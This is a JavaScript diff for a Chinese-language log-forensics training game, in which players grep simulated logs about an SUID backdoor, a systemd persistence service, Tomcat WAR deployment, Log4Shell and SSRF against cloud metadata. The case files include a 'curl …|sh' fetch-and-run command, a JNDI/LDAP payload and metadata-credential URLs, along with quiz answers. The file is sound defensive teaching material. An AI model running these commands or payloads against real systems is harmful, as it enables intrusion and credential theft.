+
+  { id: 's2', ico: '🪜', title: '系统日志 · SUID 提权后门', cat: 'Linux 系统日志', diff: 2,
+    brief: '一次常规的 SUID 排查，多出了一个不该存在的"兄弟"。',
+    files: { '/logs/suid_find.txt': [
+      '# find / -perm -4000 -type f 2>/dev/null',
+      '/usr/bin/passwd',
+      '/usr/bin/sudo',
+      '/usr/bin/su',
+      '/usr/bin/mount',
+      '/tmp/.cache/update',
+    ]},
+    tasks: [
+      { q: '可疑的 SUID 文件完整路径', hint: 'cat /logs/suid_find.txt 找不在系统目录的那个', ans: ['/tmp/.cache/update'], teach: '🪜 SUID 位=以文件属主(root)身份运行。放在 /tmp/.cache 的 SUID 文件几乎必是后门。' },
+      { q: '这个文件的用途定性（输 check 四个字）', hint: 'SUID root 的提权跳板=?', ans: ['提权后门', '后门'], teach: '🔓 若它是 bash 的拷贝，任何人执行即得 root shell——一分钟接管全机。' },
+      { q: '处置动作（输 check 命令或动作）', hint: '去掉 SUID 位或直接删除', ans: ['chmod -s', '去除s位', '删除', '删掉'], teach: '🧹 chmod -s 去位或删除，同时追查"谁放进去的"——它意味着已有 root 权限的攻击者来过。' },
+    ],
+    victory: ['结论：/tmp/.cache/update 为 SUID 提权后门。', '根除：去 SUID/删除 → 追查投放来源 → 全盘 SUID 清点常态化。'] },
+
+  { id: 's3', ico: '⚙️', title: '系统日志 · systemd 服务持久化', cat: 'Linux 系统日志', diff: 3,
+    brief: '一个名字很"正经"的服务，干的活可不正经。',
+    files: {
+      '/etc/systemd/system/dbus-upd.service': [
+        '[Unit]',
+        'Description=DBus Update Daemon',
+        '[Service]',
+        'Type=simple',
+        'ExecStart=/bin/bash -c "curl -s http://45.60.40.10/s|sh"',
+        'Restart=always',
+        '[Install]',
+        'WantedBy=multi-user.target',
+      ],
+      '/logs/systemctl_list.txt': [
+        'UNIT FILE          STATE    PRESET',
+        'dbus-upd.service   enabled  enabled',
+        'nginx.service      enabled  enabled',
+        'sshd.service       enabled  enabled',
+      ],
+    },
+    tasks: [
+      { q: '恶意服务的名字（含 .service）', hint: 'grep curl /etc/systemd/system/dbus-upd.service 或对比清单', ans: ['dbus-upd.service', 'dbus-upd'], teach: '⚙️ 伪装成 DBus 的名字+Restart=always：被杀自动复活，开机自启。' },
+      { q: 'ExecStart 里的下载命令关键词（输 check 命令名）', hint: '服务启动时执行什么', ans: ['curl'], teach: '🔁 curl|sh 三件套在 systemd 里同样致命，而且 systemd 会帮你"保活"。' },
+      { q: '根除动作（输 check：禁用+删除 或 systemctl 命令）', hint: '两步：先 systemctl disable 再删文件', ans: ['disable', '禁用', '删除', 'stop'], teach: '🧹 systemctl disable + 删 service 文件 + daemon-reload，三步才干净。' },
+    ],
+    victory: ['结论：dbus-upd.service 为 systemd 持久化后门，开机自启+自动保活。', '根除：disable → 删文件 → daemon-reload → 排查同账号其他持久化。'] },
+
+  /* ========== ⑭ 中间件日志 ========== */
+  { id: 't1', ico: '🫙', title: '中间件日志 · Tomcat 弱口令部署', cat: '中间件日志', diff: 1,
+    brief: 'Manager 后台的弱口令，被人用来"上传"了一个新应用。',
+    files: { '/logs/tomcat_manager.log': [
+      '14:00:00 LOGIN admin FAIL from 203.0.113.66',
+      '14:00:20 LOGIN admin FAIL from 203.0.113.66',
+      '14:00:41 LOGIN admin OK from 203.0.113.66',
+      '14:01:10 PUT /manager/text/deploy?path=/app2 war=shell.war UPLOAD 200',
+      '14:01:30 GET /app2/ 200 (应用启动)',
+      '14:02:00 GET /app2/cmd.jsp?c=whoami 200',
+    ]},
+    tasks: [
+      { q: '被利用的管理功能名', hint: 'cat /logs/tomcat_manager.log 看 URL 路径', ans: ['manager'], teach: '🫙 Tomcat Manager 支持热部署 WAR 包——弱口令+公网暴露=直接上线 Web 应用级后门。' },
+      { q: '攻击者部署的应用路径', hint: 'grep deploy /logs/tomcat_manager.log', ans: ['/app2', 'app2'], teach: '📦 war 部署即"上传即运行"，比单文件 Webshell 能力更强。' },
+      { q: '部署后执行的命令', hint: '看最后一条 GET 的参数', ans: ['whoami'], teach: '🎯 cmd.jsp?c=whoami = 战争包级后门开始工作。Manager 后台必须限源+强口令。' },
+    ],
+    victory: ['结论：203.0.113.66 用 admin 弱口令经 Manager 部署 WAR 后门。', '处置：下线应用 → 改口令限源 → 删 war → 排查该会话全部部署。'] },
+
+  { id: 't2', ico: '🧨', title: '中间件日志 · Log4j JNDI 利用', cat: '中间件日志', diff: 2,
+    brief: 'User-Agent 里藏了一串"咒语"，服务器念出来就中招了。',
+    files: { '/logs/app_error.log': [
+      '14:00:00 ERROR Attempting to resolve ${jndi:ldap://x.evil-cdn.net/a}',
+      '14:00:01 WARN Connection to 45.83.66.10:1389 established',
+      '14:00:02 ERROR Class loaded from remote LDAP source',
+      '14:00:05 WARN Outbound: 45.83.66.10:4444 (C2)',
+    ]},
+    tasks: [
+      { q: '这个漏洞的名称（输 check，如 Log4j 或其别名）', hint: '${jndi:ldap://…} 是哪个著名漏洞的特征', ans: ['log4j', 'log4shell', 'jndi', 'log4j2'], teach: '🧨 Log4Shell(CVE-2021-44228)：日志框架把 ${jndi:...} 当指令执行，一行日志打穿全球。' },
+      { q: 'JNDI 回连使用的端口', hint: 'grep ldap /logs/app_error.log', ans: ['1389'], teach: '🔌 LDAP(1389) 是 JNDI 注入常用回连协议，加载远程恶意类。' },
+      { q: '触发注入的字段', hint: '攻击载荷通常藏在请求头的哪里？', ans: ['user-agent', 'useragent'], teach: '🧷 UA/Referer 等一切会被记录进日志的字段都能触发——"日志"本身就是攻击面。' },
+    ],
+    victory: ['结论：Log4Shell 被利用，经 LDAP 加载恶意类并回连 C2:4444。', '处置：升级 Log4j → 出口封禁 → 全网比对 jndi 特征日志。'] },
+
+  { id: 't3', ico: ' 🛰️', title: '中间件日志 · SSRF 打云元数据', cat: '中间件日志', diff: 3,
+    brief: '一个"网页预览"功能，被人指路去访问云主机的"身份证柜"。',
+    files: { '/logs/app_access.log': [
+      '14:00:00 GET /fetch?url=https://example.com/normal.png (正常预览)',
+      '14:01:00 GET /fetch?url=http://169.254.169.254/latest/meta-data/ 200',
+      '14:01:05 GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ 200',
+      '14:01:10 GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-web 200',
+      '14:01:20 OUTBOUND 45.83.66.10:443 (使用刚获取的凭证调用对象存储)',
+    ]},
+    tasks: [
+      { q: '被探测的云元数据内部地址', hint: 'grep 169.254 /logs/app_access.log', ans: ['169.254.169.254'], teach: '🛰️ 169.254.169.254 是云元数据服务，存有主机身份与临时凭证。' },
+      { q: '攻击者最终想偷的东西（输 check 两字）', hint: 'iam/security-credentials/ 下面是什么', ans: ['凭证', '凭据', '密钥', '凭证'], teach: '🔑 拿到云临时凭证=以服务器身份操作云资源（读存储、开机、删库）。' },
+      { q: '利用的漏洞类型（输 check 四个字母）', hint: '服务器被"指路"访问内部地址=?', ans: ['ssrf'], teach: '🗺️ SSRF（服务端请求伪造）：OWASP A10。修复=禁内网地址+元数据 v2(强制 token)。' },
+    ],
+    victory: ['结论：SSRF 经 /fetch 功能读取云元数据并窃取 IAM 临时凭证。', '处置：轮换凭证 → 修复 URL 校验 → 开启元数据 IMDSv2 → 出口审计。'] },
+  ];
+
+  /* ============================================================
+     引擎（文件系统 + 三剑客 + check）
+     ============================================================ */
+  let box, inputLine, input;
+  let busy = false;
+  let history = [];
+  let histIdx = -1;
+  let cur = null, curTaskIdx = 0;
+  const done = new Set();
+  let VM = { files: {} };
+  let pickCat = '全部', pickDiff = 0;
+
+  function scrollBottom() { box.scrollTop = box.scrollHeight; }
+  function print(html, cls = 't-c') {
+    const div = document.createElement('div');
+    div.className = 'ln ' + cls;
+    div.innerHTML = html;
+    box.insertBefore(div, inputLine);
+    scrollBottom();
+  }
+  function printRaw(t, cls) { print(esc(t), cls || 't-c'); }
+  function printDelay(lines, done) {
+    busy = true;
+    let i = 0;
+    (function next() {
+      if (i >= lines.length) { busy = false; done && done(); return; }
+      const [html, cls, delay] = lines[i++];
+      print(html, cls || 't-c');
+      setTimeout(next, delay == null ? 60 : delay);
+    })();
+  }
+
+  function resolvePath(p) {
+    if (!p) return null;
+    if (p.startsWith('/')) return p;
+    if (p.startsWith('./')) return p.slice(2);
+    return p;
+  }
+  function findFile(arg) {
+    const p = resolvePath(arg);
+    if (VM.files[p] != null) return VM.files[p];
+    const base = p.split('/').pop();
+    for (const k of Object.keys(VM.files)) {
+      const kb = k.split('/').pop();
+      if (k === p || kb === base || k.includes(base) || base.includes(kb)) return VM.files[k];
+    }
+    return undefined;
+  }
+
+  function stageRun(stage, stdin) {
+    const cmd = stage.cmd, a = stage.args;
+    if (cmd === 'history') return { lines: history.slice().reverse().map((h, i) => `  ${i + 1}  ${h}`) };
+
+    let src = stdin;
+    if (src == null) {
+      const nonOpt = a.filter(x => !x.startsWith('-') && !(cmd === 'sed' && /(^s[/#]|^\d+,\d+p$)/.test(x)));
+      if (!nonOpt.length) return { error: `${cmd}: 缺少输入（需要文件名或管道输入）` };
+      const fileArg = nonOpt[nonOpt.length - 1];
+      const found = findFile(fileArg);
+      if (found == null) return { error: `${cmd}: ${fileArg}: 没有那个文件或目录（试试 find / 定位）` };
+      src = found.slice();
+    }
+
+    if (cmd === 'cat' || cmd === 'type') return { lines: src };
+    if (cmd === 'grep') {
+      const ignoreCase = a.includes('-i'), count = a.includes('-c'), invert = a.includes('-v'), regex = a.includes('-E');
+      const nonOpt = a.filter(x => !x.startsWith('-'));
+      const patArg = nonOpt[0];
+      if (!patArg) return { error: 'grep: 用法 grep [选项] <模式> <文件>' };
+      const pat = patArg.replace(/^['"]|['"]$/g, '');
+      let re; try { re = new RegExp(regex ? pat : pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), ignoreCase ? 'i' : ''); }
+      catch (e) { return { error: `grep: 无效模式 ${patArg}` }; }
+      let matched = src.filter(l => re.test(l));
+      if (invert) matched = src.filter(l => !re.test(l));
+      if (count) return { lines: [String(matched.length)] };
+      return { lines: matched };
+    }
+    if (cmd === 'sed') {
+      const nonOpt = a.filter(x => !x.startsWith('-'));
+      const expr = (nonOpt[0] || '').replace(/^['"]|['"]$/g, '');
+      const mP = expr.match(/^(\d+),(\d+)p$/);
+      if (a.includes('-n') && mP) return { lines: src.slice(+mP[1] - 1, +mP[2]) };
+      const mS = expr.match(/^s[/#](.*?)[/#](.*?)[/#]?([gi]*)$/);
+      if (mS) {
+        let re; try { re = new RegExp(mS[1], mS[3] || ''); } catch (e) { return { error: 'sed: 无效替换' }; }
+        return { lines: src.map(l => l.replace(re, mS[2])) };
+      }
+      return { error: "sed: 支持 sed -n 'N,Mp' 文件 与 sed 's/旧/新/[g]' 文件" };
+    }
+    if (cmd === 'head' || cmd === 'tail') {
+      let n = 10; const ni = a.findIndex(x => x === '-n');
+      if (ni > -1 && a[ni + 1]) n = +a[ni + 1]; else { const m = a.find(x => /^-?\d+$/.test(x)); if (m) n = Math.abs(+m); }
+      return { lines: cmd === 'head' ? src.slice(0, n) : src.slice(-n) };
+    }
+    if (cmd === 'wc') {
+      if (a.includes('-l')) return { lines: [String(src.length)] };
+      return { lines: [`${src.length} ${src.reduce((s, l) => s + l.length, 0)}`] };
+    }
+    if (cmd === 'awk') {
+      const prog = a.find(x => x.startsWith('{')) || a.find(x => x.includes('print'));
+      if (!prog) return { error: "awk: 仅支持 {print $N} 形式" };
+      const fields = [...prog.matchAll(/\$(\d+|NF)/g)].map(m => m[1]);
+      const out = src.map(l => {
+        const parts = l.trim().split(/\s+/);
+        if (!parts[0]) return '';
+        return fields.map(f => f === 'NF' ? String(parts.length) : (parts[+f - 1] || '')).join(' ');
+      });
+      return { lines: out };
+    }
+    if (cmd === 'sort') {
+      const arr = src.slice();
+      if (a.includes('-n')) arr.sort((x, y) => +x - +y); else arr.sort();
+      if (a.includes('-r')) arr.reverse();
+      return { lines: arr };
+    }
+    if (cmd === 'uniq') {
+      const count = a.includes('-c');
+      const out = []; let prev, c = 0;
+      src.forEach(l => { if (l === prev) c++; else { if (prev != null) out.push(count ? `${String(c).padStart(7)} ${prev}` : prev); prev = l; c = 1; } });
+      if (prev != null) out.push(count ? `${String(c).padStart(7)} ${prev}` : prev);
+      return { lines: out };
+    }
+    return { error: `${cmd}: 命令未实现（输 help 看支持列表）` };
+  }
+
+  function execStage(tokens, stdin) {
+    if (!tokens.length) return { lines: [] };
+    const cmd = tokens[0], args = tokens.slice(1);
+    if (cmd === 'ls') {
+      const base = args.find(x => !x.startsWith('-')) || '';
+      const pre = base === '' ? '/' : (base.endsWith('/') ? base : base + '/');
+      const set = new Set();
+      Object.keys(VM.files).forEach(k => {
+        if (k.startsWith(pre)) {
+          const rest = k.slice(pre.length);
+          set.add(rest.includes('/') ? rest.split('/')[0] + '/' : rest);
+        }
+      });
+      if (!set.size) return { lines: Object.keys(VM.files).map(k => k.split('/').pop()) };
+      return { lines: [...set].sort() };
+    }
+    if (cmd === 'pwd') return { lines: ['/'] };
+    if (cmd === 'cd') return { lines: [] };
+    if (cmd === 'find') {
+      const nameF = args.indexOf('-name');
+      if (nameF > -1 && args[nameF + 1]) {
+        const pat = args[nameF + 1].replace(/\*/g, '').replace(/^['"]|['"]$/g, '');
+        return { lines: Object.keys(VM.files).filter(k => k.includes(pat)) };
+      }
+      return { lines: Object.keys(VM.files) };
+    }
+    if (cmd === 'cat' || cmd === 'type' || cmd === 'grep' || cmd === 'sed' || cmd === 'head' || cmd === 'tail' || cmd === 'wc' || cmd === 'awk' || cmd === 'sort' || cmd === 'uniq' || cmd === 'history') {
+      return stageRun({ cmd, args }, stdin);
+    }
+    return { error: `bash: ${cmd}: command not found（输 help 看支持列表）` };
+  }
+
+  function parseLine(line) {
+    const tokens = line.match(/'[^']*'|"[^"]*"|\S+/g) || [];
+    return tokens.map(t => t.replace(/^['"]|['"]$/g, ''));
+  }
+  function runPipeline(tokens) {
+    const pipeIdx = tokens.indexOf('|');
+    if (pipeIdx === -1) {
+      const res = execStage(tokens, null);
+      if (res.error) { printRaw(res.error, 't-r'); return; }
+      (res.lines || []).forEach(l => printRaw(l));
+      return;
+    }
+    let stdin = null, rest = tokens;
+    while (true) {
+      const i = rest.indexOf('|');
+      const seg = i === -1 ? rest : rest.slice(0, i);
+      const res = execStage(seg, stdin);
+      if (res.error) { printRaw(res.error, 't-r'); return; }
+      if (i === -1) { (res.lines || []).forEach(l => printRaw(l)); return; }
+      stdin = res.lines;
+      rest = rest.slice(i + 1);
+    }
+  }
+
+  function norm(s) { return String(s).toLowerCase().trim().replace(/\s+/g, ' ').replace(/[，,。]/g, ''); }
+  function matchAns(user, ansList) {
+    const u = norm(user); if (!u) return false;
+    return ansList.some(a0 => {
+      const t = norm(a0);
+      if (u === t) return true;
+      if (t.length >= 4 && (u.includes(t) || t.includes(u))) return true;
+      return false;
+    });
+  }
+
+  function run(line) {
+    const cmd = line.trim();
+    if (!cmd) return;
+    history.unshift(cmd); if (history.length > 60) history.pop(); histIdx = -1;
+    print(`<span class="t-p">detective@sec-lab:~$</span> ${esc(cmd)}`, '');
+
+    const lower = cmd.toLowerCase();
+    if (lower === 'help' || lower === '?') return showHelp();
+    if (lower === 'clear') { box.querySelectorAll('.ln:not(.ln-in)').forEach(el => el.remove()); return; }
+    if (lower === 'hint') { print('💡 ' + currentTask().hint, 't-w'); return; }
+    if (lower === 'task' || lower === 'tasks') return showTasks();
+    if (lower === 'next') return pickRandom();
+    if (lower === 'reset' || lower === 'restart') return loadScenario(cur.id);
+    if (lower === 'history') { history.slice(0, 15).reverse().forEach((h, i) => printRaw(`  ${i + 1}  ${h}`)); return; }
+    if (lower.startsWith('check')) return doCheck(cmd.slice(5).trim());
+
+    const segs = cmd.split(';').map(s => s.trim()).filter(Boolean);
+    for (const seg of segs) {
+      const before = box.querySelectorAll('.ln:not(.ln-in)').length;
+      runPipeline(parseLine(seg));
+      const after = box.querySelectorAll('.ln:not(.ln-in)').length;
+      if (after === before && !busy) printRaw('（无输出）', 't-w');
+    }
+  }
+
+  function currentTask() { return cur.tasks[curTaskIdx] || cur.tasks[cur.tasks.length - 1]; }
+
+  function doCheck(arg) {
+    if (!arg.trim()) { print('check: 用法 check <你的结论>（卡住输 hint）', 't-w'); return; }
+    const t = currentTask();
+    if (matchAns(arg, t.ans)) {
+      if (!done.has(curTaskIdx)) {
+        done.add(curTaskIdx);
+        Progress.addXP(12, `日志取证：${t.q.slice(0, 12)}…`);
+      }
+      printDelay([
+        [`✅ 取证正确！ +12 XP`, 't-g', 120],
+        [`📚 ${t.teach}`, 't-w', 80],
+      ], () => {
+        curTaskIdx++;
+        updateSidebar();
+        if (curTaskIdx < cur.tasks.length) printRaw(`\n▶ 下一项：${cur.tasks[curTaskIdx].q}`, 't-i');
+        else victory();
+      });
+    } else {
+      print('❌ 证据不足或结论有误。换条命令再挖挖，或输 hint。', 't-r');
+    }
+  }
+
+  function victory() {
+    Progress.recordGame('log', 95);
+    Progress.addXP(30, '日志取证结案');
+    printDelay([
+      [``, 't-g', 60],
+      [`╔══════════════════════════════╗`, 't-g', 60],
+      [`║  🔍 取证结案：${cur.title}`, 't-g', 60],
+      [`╚══════════════════════════════╝`, 't-g', 60],
+      [``, 't-c', 80],
+      ...cur.victory.map(v => [`${v}`, 't-c', 80]),
+      [``, 't-c', 80],
+      [`+30 XP · 输 next 随机换案，或点「📂 案情题库」自选`, 't-g', 80],
+    ], () => { if (window.App) { App.confetti(80); App.toast(`取证结案「${cur.title}」！`, '🔍', true); } });
+    updateSidebar();
+  }
+
+  function showHelp() {
+    const rows = [
+      ['find / find -name "*.log"', '定位日志文件（第一件事！）'],
+      ['ls [目录] / cat <文件>', '浏览目录 / 查看日志'],
+      ['grep [-i/-c/-v/-E] <模式> <文件>', '关键词筛选'],
+      ["awk '{print $N}'", '取第 N 列（配合管道统计）'],
+      ["sed -n '2,5p' <文件>", '取行区间（三剑客之打印）'],
+      ["sed 's/旧/新/g' <文件>", '替换/清洗（三剑客之替换）'],
+      ['head/tail [-n N] / wc -l', '首尾行 / 计数'],
+      ['sort | uniq -c | sort -rn', 'Top-N 统计经典流水线'],
+      ['— 教学命令 —', ''],
+      ['hint / task / tasks / check <答案>', '提示 / 清单 / 提交结论'],
+      ['next / reset / clear / history', '换案 / 重做 / 清屏 / 历史'],
+    ];
+    print('取证命令面板（管道 | 与分号 ; 均支持）：', 't-i');
+    rows.forEach(r => print(`  <span class="t-p">${r[0]}</span><span style="color:var(--tx3)"> ${r[1] ? '— ' + r[1] : ''}</span>`));
+    print('💡 本案日志文件可以用 find 先定位，再用三剑客筛查。卡住就 hint。', 't-w');
+  }
+  function showTasks() {
+    print(`📋 ${cur.title} 取证清单：`, 't-i');
+    cur.tasks.forEach((t, i) => {
+      const d = done.has(i), isCur = i === curTaskIdx;
+      print(`  ${d ? '✅' : isCur ? '▶' : '○'} ${t.q}${isCur ? '  ← 当前' : ''}`, d ? 't-g' : isCur ? 't-w' : 't-c');
+    });
+  }
+
+  function updateSidebar() {
+    if (!cur) return;
+    const stars = '★'.repeat(cur.diff) + '☆'.repeat(3 - cur.diff);
+    $('#curCase').innerHTML = `<span style="font-size:20px">${cur.ico}</span> <b style="color:var(--am)">${cur.title}</b><br>${cur.brief}<br><small style="color:var(--tx3);font-family:var(--m)">类别：${cur.cat} · 难度：${stars} · 问题 ${done.size}/${cur.tasks.length}</small>`;
+    $('#taskChecklist').innerHTML = cur.tasks.map((t, i) => {
+      const d = done.has(i), isCur = i === curTaskIdx;
+      return `<div class="tc-item ${d ? 'done' : ''} ${isCur ? 'cur' : ''}">
+        <span class="tc-dot">${d ? '✓' : isCur ? '▶' : ''}</span><span>${t.q}</span></div>`;
+    }).join('');
+    $('#hintBtn').onclick = () => print('💡 ' + currentTask().hint, 't-w');
+    renderPicker();
+  }
+
+  function renderPicker() {
+    const cats = ['全部', ...new Set(CASES.map(s => s.cat))];
+    $('#pickerCats').innerHTML = cats.map(c =>
+      `<button class="chip ${c === pickCat ? 'on' : ''}" data-c="${c}">${c}</button>`).join('');
+    document.querySelectorAll('#pickerCats .chip').forEach(b => {
+      b.onclick = () => { pickCat = b.dataset.c; renderPicker(); };
+    });
+    const diffs = [[0, '全部难度'], [1, '★ 入门'], [2, '★★ 进阶'], [3, '★★★ 挑战']];
+    $('#pickerDiffs').innerHTML = diffs.map(d =>
+      `<button class="chip ${pickDiff === d[0] ? 'on' : ''}" data-d="${d[0]}">${d[1]}</button>`).join('');
+    document.querySelectorAll('#pickerDiffs .chip').forEach(b => {
+      b.onclick = () => { pickDiff = +b.dataset.d; renderPicker(); };
+    });
+    const list = CASES.filter(s => (pickCat === '全部' || s.cat === pickCat) && (!pickDiff || s.diff === pickDiff));
+    $('#pickCount').textContent = `· ${list.length} 案`;
+    $('#pickerGrid').innerHTML = list.map(s => {
+      const stars = '★'.repeat(s.diff) + '☆'.repeat(3 - s.diff);
+      return `<div class="pick-card ${cur && s.id === cur.id ? 'playing' : ''}" data-id="${s.id}">
+        <div class="p-top"><span class="p-ico">${s.ico}</span><b>${s.title}</b></div>
+        <small>${s.cat} · ${stars}</small>
+        <small style="color:var(--tx2);font-family:var(--f)">${s.brief.slice(0, 28)}…</small>
+      </div>`;
+    }).join('');
+    document.querySelectorAll('.pick-card').forEach(el => {
+      el.onclick = () => { $('#pickerMask').classList.remove('open'); loadScenario(el.dataset.id); };
+    });
+  }
+
+  function loadScenario(id) {
+    cur = CASES.find(s => s.id === id) || CASES[0];
+    curTaskIdx = 0; done.clear(); history = []; histIdx = -1;
+    VM = { files: cur.files || {} };
+    localStorage.setItem('det_last', cur.id);
+    box.querySelectorAll('.ln:not(.ln-in)').forEach(el => el.remove());
+    updateSidebar();
+    const stars = '★'.repeat(cur.diff) + '☆'.repeat(3 - cur.diff);
+    busy = true;
+    printDelay([
+      [`取证终端就绪 · 身份 日志侦探（只读权限）`, 't-c', 220],
+      [``, 't-c', 50],
+      [`╔════════════════════════════════╗`, 't-r', 60],
+      [`║ ${cur.ico} 案情：${cur.title}`, 't-r', 60],
+      [`╚════════════════════════════════╝`, 't-r', 60],
+      [``, 't-c', 50],
+      [`${cur.brief}`, 't-c', 60],
+      [`类别：${cur.cat} · 难度：${stars} · 问题 ${cur.tasks.length} 项`, 't-w', 60],
+      [``, 't-c', 50],
+      [`工作流：先 <span class="t-p">find /</span> 定位日志文件 → 三剑客筛查 → <span class="t-p">check 答案</span>`, 't-c', 60],
+      [`▶ 任务 1：${cur.tasks[0].q}`, 't-i', 80],
+    ], () => { busy = false; inputLine.style.visibility = 'visible'; input.focus({ preventScroll: true }); });
+  }
+
+  function pickRandom() {
+    let pool = CASES.filter(s => !cur || s.id !== cur.id);
+    const last = localStorage.getItem('det_last');
+    if (pool.length > 1 && last) pool = pool.filter(s => s.id !== last);
+    const s = pool[Math.floor(Math.random() * pool.length)] || CASES[0];
+    loadScenario(s.id);
+  }
+
+  function buildInput() {
+    inputLine = document.createElement('div');
+    inputLine.className = 'ln ln-in';
+    inputLine.innerHTML = `<span class="ps1">detective@sec-lab:~$</span>`;
+    input = document.createElement('input');
+    input.className = 'term-input';
+    input.autocomplete = 'off'; input.spellcheck = false;
+    input.setAttribute('aria-label', '取证命令输入');
+    inputLine.appendChild(input);
+    box.appendChild(inputLine);
+    input.addEventListener('keydown', e => {
+      if (busy) { e.preventDefault(); return; }
+      if (e.key === 'Enter') { const v = input.value; input.value = ''; run(v); }
+      else if (e.key === 'ArrowUp') { e.preventDefault(); if (history.length) { histIdx = Math.min(histIdx + 1, history.length - 1); input.value = history[histIdx] || ''; } }
+      else if (e.key === 'ArrowDown') { e.preventDefault(); histIdx = Math.max(histIdx - 1, -1); input.value = histIdx === -1 ? '' : (history[histIdx] || ''); }
+      else if (e.key === 'Tab') { e.preventDefault(); }
+    });
+    box.addEventListener('click', () => { if (input && !busy) input.focus({ preventScroll: true }); });
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    box = document.getElementById('termBody');
+    if (!box) return;
+    box.innerHTML = '';
+    buildInput();
+    inputLine.style.visibility = 'hidden';
+    updateSidebar();
+    $('#randomBtn').onclick = () => pickRandom();
+    $('#pickerBtn').onclick = () => { renderPicker(); $('#pickerMask').classList.add('open'); };
+    $('#pickerClose').onclick = () => $('#pickerMask').classList.remove('open');
+    $('#pickerMask').addEventListener('click', e => { if (e.target === $('#pickerMask')) $('#pickerMask').classList.remove('open'); });
+    $('#labReset').onclick = () => loadScenario(cur.id);
+    pickRandom();
+  });
+})();
